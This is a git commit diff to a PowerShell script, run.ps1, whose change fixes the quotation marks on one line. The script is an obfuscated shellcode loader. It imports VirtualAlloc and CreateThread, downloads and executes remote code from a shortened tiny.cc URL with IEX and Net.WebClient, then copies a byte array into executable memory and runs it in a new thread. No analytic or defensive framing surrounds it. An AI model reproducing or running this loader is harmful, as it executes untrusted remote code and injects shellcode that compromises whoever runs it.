6dadce0572ad3e4bfb6b105e79119ef755116e5a
Christofer Tibbelin <christofer.tibbelin@cygate.se>
2020-02-28 13:22:05 +0100

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -5,7 +5,7 @@ public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flA
 public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 "@
 $hjqvxVXLTyGfsYl = Add-Type -memberDefinition $ATkkKfGKoZimxF -Name "Win32" -namespace Win32Functions -passthru
-IEX(New-Object Net.WebClient).DownloadString(‘https://tiny.cc/w5nmkz’);
+IEX(New-Object Net.WebClient).DownloadString('https://tiny.cc/w5nmkz');
 $TtAUVnDlaqWqVFH = $hjqvxVXLTyGfsYl::VirtualAlloc(0,[Math]::Max($bASSkdiXcDveDg.Length,0x1000),0x3000,0x40)
 [System.Runtime.InteropServices.Marshal]::Copy($bASSkdiXcDveDg,0,$TtAUVnDlaqWqVFH,$bASSkdiXcDveDg.Length)
 $hjqvxVXLTyGfsYl::CreateThread(0,0,$TtAUVnDlaqWqVFH,0,0,0)
